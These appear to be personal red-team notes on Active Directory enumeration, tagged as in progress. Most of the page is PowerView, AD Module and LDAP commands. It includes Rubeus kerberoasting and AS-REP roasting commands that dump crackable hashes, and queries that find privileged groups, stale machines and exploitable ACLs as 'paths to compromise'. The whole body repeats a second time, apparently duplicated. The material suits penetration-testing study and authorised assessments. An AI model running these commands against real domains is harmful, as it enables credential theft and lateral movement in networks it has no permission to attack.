---
title: AD enumeration — domain objects
date: 2026-04-18
tags:
  - red-team
  - ad
  - enum
description: Deep enumeration of Active Directory objects with PowerView, AD Module, and raw LDAP.
---

Deep enumeration of Active Directory objects with PowerView, AD Module, and raw LDAP.

> [!note]
> Always validate findings with BloodHound. Manual enumeration is great
> for precision; BloodHound excels at mapping relationships.

## Users

List domain users with their key attributes.

```powershell
# PowerView
Get-DomainUser -Properties samaccountname,description

# AD Module
Get-ADUser -Filter * -Properties description | Select samaccountname,description

# Raw LDAP (LDAPS preferred)
Get-ADObject -LDAPFilter "(objectClass=user)" -Properties *
```

### kerberoastable

Filter accounts with a configured Service Principal Name (SPN). These
accounts can be roasted offline once you have a TGT.

```powershell
# PowerView
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

### asreproastable

Accounts with `DONT_REQ_PREAUTH` enabled — request AS-REP responses
without needing the password.

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired

# Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

## Groups

Privileged groups and nested membership chains. Look beyond the
obvious targets (Domain Admins) — Enterprise Admins, Account Operators,
and DNSAdmins may all provide indirect paths to compromise.

```powershell
# Membership of common privileged groups
Get-DomainGroupMember "Domain Admins" -Recurse
Get-DomainGroupMember "Enterprise Admins" -Recurse
Get-DomainGroupMember "DNSAdmins" -Recurse
```

## Computers

Domain-joined machines, operating system versions, and last logon dates.

```powershell
# Find stale machines (often forgotten, may have weak credentials)
Get-DomainComputer -Properties operatingsystem,lastlogontimestamp |
    Select samaccountname,operatingsystem,lastlogontimestamp
```

## GPOs / OUs

Policy targets and OU structure — useful for identifying lateral
movement paths through GPO abuse.

```powershell
Get-DomainGPO -Properties displayname,gpcfilesyspath
Get-DomainOU | select name,distinguishedname
```

## ACLs / ACEs

Dangerous ACEs on domain objects. Most modern attack paths originate here.

```powershell
# Find ACEs where the current user has interesting rights
Find-InterestingDomainAcl -ResolveGUIDs |
    ?{ $_.IdentityReferenceName -eq $env:USERNAME }
```

In progress 




```powershell
# PowerView
Get-DomainUser -Properties samaccountname,description

# AD Module
Get-ADUser -Filter * -Properties description | Select samaccountname,description

# Raw LDAP (LDAPS preferred)
Get-ADObject -LDAPFilter "(objectClass=user)" -Properties *
```

### kerberoastable

Filter accounts with a configured Service Principal Name (SPN). These
accounts can be roasted offline once you have a TGT.

```powershell
# PowerView
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

### asreproastable

Accounts with `DONT_REQ_PREAUTH` enabled — request AS-REP responses
without needing the password.

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired

# Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

## Groups

Privileged groups and nested membership chains. Look beyond the
obvious targets (Domain Admins) — Enterprise Admins, Account Operators,
and DNSAdmins may all provide indirect paths to compromise.

```powershell
# Membership of common privileged groups
Get-DomainGroupMember "Domain Admins" -Recurse
Get-DomainGroupMember "Enterprise Admins" -Recurse
Get-DomainGroupMember "DNSAdmins" -Recurse
```

## Computers

Domain-joined machines, operating system versions, and last logon dates.

```powershell
# Find stale machines (often forgotten, may have weak credentials)
Get-DomainComputer -Properties operatingsystem,lastlogontimestamp |
    Select samaccountname,operatingsystem,lastlogontimestamp
```

## GPOs / OUs

Policy targets and OU structure — useful for identifying lateral
movement paths through GPO abuse.

```powershell
Get-DomainGPO -Properties displayname,gpcfilesyspath
Get-DomainOU | select name,distinguishedname
```

## ACLs / ACEs

Dangerous ACEs on domain objects. Most modern attack paths originate here.

```powershell
# Find ACEs where the current user has interesting rights
Find-InterestingDomainAcl -ResolveGUIDs |
    ?{ $_.IdentityReferenceName -eq $env:USERNAME }
```

In progress 


